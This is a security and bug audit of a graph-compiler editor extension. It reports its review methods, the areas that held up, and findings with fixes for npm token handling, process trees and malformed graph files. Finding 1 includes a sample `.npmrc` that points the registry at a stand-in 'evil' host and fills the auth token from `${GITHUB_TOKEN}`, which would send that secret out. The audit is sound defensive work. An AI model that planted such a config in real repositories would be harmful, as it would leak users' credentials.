# Audit: bugs and vulnerabilities

Before Release (Phase 14), November 2026. A first pass over the extension for security problems and
bugs, and the fixes, one step each. A "Built" section after each step says what it built.

## How it was checked

- **Dependencies:** `npm audit`. The extension's runtime dependencies (elkjs, web-tree-sitter) have no
  advisories. `fast-uri` has a moderate one, only through `ajv` in the tests.
- **The trust boundaries, by hand:**
  - processes;
  - workspace trust (Restricted Mode);
  - the webviews: their Content Security Policy, what they render as HTML, and the messages they send;
  - where compiling writes and removes files;
  - the npm download.
- **Lint:** typescript-eslint over `src/`, with bug-finding rules (floating promises, misused
  promises, conditions that are always true, objects turned into strings, unused code).
- **Fuzzing:**
  - 3,000 mutations of the fixture graphs, parsed and compiled in every language;
  - every code scanner timed on pathological input, to catch regexes that backtrack.

## What held up

- Every process is started with `spawn` and no shell.
- Run, Simulate, Debug, Run Tests and Test Node Library check workspace trust, and the editor's
  buttons check again.
- The webviews allow only the extension's own nonce scripts, so HTML put in them can't run script.
- Compile output is named from the graph's file name, never from its contents.
- The tar reader skips entries outside its folder and anything that isn't a file.
- Simulate stops infinite loops, and runs its debugger in a worker.
- Every scanner handled every pathological input in under 300 ms, except a deeply nested
  TypeScript generic at about 0.5 s.

## Findings

1. **A cloned repository's `.npmrc` could send environment variables to a server it names**
   (security, medium).
   - Add Blueprint Package › From npm read the workspace's `.npmrc` for the registry and its token,
     and `${VARIABLE}` in a token is read from the environment.
   - So `registry=https://evil/` with `//evil/:_authToken=${GITHUB_TOKEN}` sent that variable with the
     first search, even in Restricted Mode.
   - The token also went to whatever host the registry named for the download, and over plain http.
   - The user's own `~/.npmrc`, where private-registry tokens usually live, wasn't read.
2. **Stop and re-run left C#, Rust and Godot programs running on Windows** (bug, medium).
   - `runCommand` aborts only the process it started. For C# that's `dotnet run`, for Rust
     `cargo run`, and for GDScript Godot's console launcher, and each starts the real program as a
     child.
   - Runs are hidden, so a stopped program went on unseen.
3. **A malformed graph file crashes the compiler** (robustness, medium).
   - `parseDocument` checks a file's outline but not the nodes, connections, pins, signatures or
     variables in it.
   - A node with no `type`, or a `null` connection (a bad merge, say), ends in a TypeError, not a
     readable error. The fuzzer found 123 distinct crashes in 19 places.
   - On save the error is unhandled: Problems isn't updated and nothing is said.
4. **Smaller ones** (low):
   - a package's `blueprint` folder wasn't checked to be inside the download, and unpacking had no
     size limit;
   - the library path the webview sends on Collapse to Function in Library isn't checked to stay
     inside the workspace folder;
   - a graph file named with `$`, `@`, `%` or `;` breaks the generated MSBuild `.targets`, and a `"`
     or `\` in a path breaks Rust's `#[path = "…"]`;
   - U+0085 in a function's description ends C#'s `///` comment;
   - a NaN or infinite literal would be written as `null` in Python;
   - unused imports and variables.

Not covered by this pass, and left for another:
- generated code in all twelve languages, beyond the conformance tests and the corpus;
- the debugger integrations, in depth;
- concurrency between compile on save, Compile and file watching;
- the webview and Codebase Map code beyond their HTML and messages.

## Steps

1. The npm registry: trust, the user's `.npmrc`, where tokens go, and limits.
2. Process trees: Stop, re-run and timeouts end the program, not just its launcher.
3. Graph files: check what's in them, with readable errors, and report a compile that fails.
4. The smaller findings, and the lint.

### Built (step 1)

- **Which `.npmrc`:** the user's (`~/.npmrc`, or `NPM_CONFIG_USERCONFIG`), then the workspace's over
  it, as npm reads them. The workspace's is read only when the workspace is trusted
  (`registryFor(name, ...npmrcs)`, blueprint-packages.ts).
- **Where a token goes** (`authorizationFor`):
  - only to URLs under its registry: the same protocol, host and port, and a path under the
    registry's;
  - only over https, or http to this computer (a local Verdaccio).
  - When the registry refuses a request the token wasn't sent with, the error says why.
- **The package:**
  - its `blueprint` folder must be inside the download (`blueprintFolder`);
  - a download may be 64 MB, and 256 MB unpacked.
- **Tests:**
  - unit (npm-registry.test.ts): the user's and the workspace's `.npmrc`, tokens kept from other
    hosts, ports, protocols and paths, http only to this computer, the Blueprint folder, and both
    size limits;
  - integration: the existing test no longer depends on the machine's `~/.npmrc`, and a new
    Restricted Mode test checks that the workspace's `.npmrc` is ignored and the user's used.
- **Docs:** node-authoring.md's npm section.
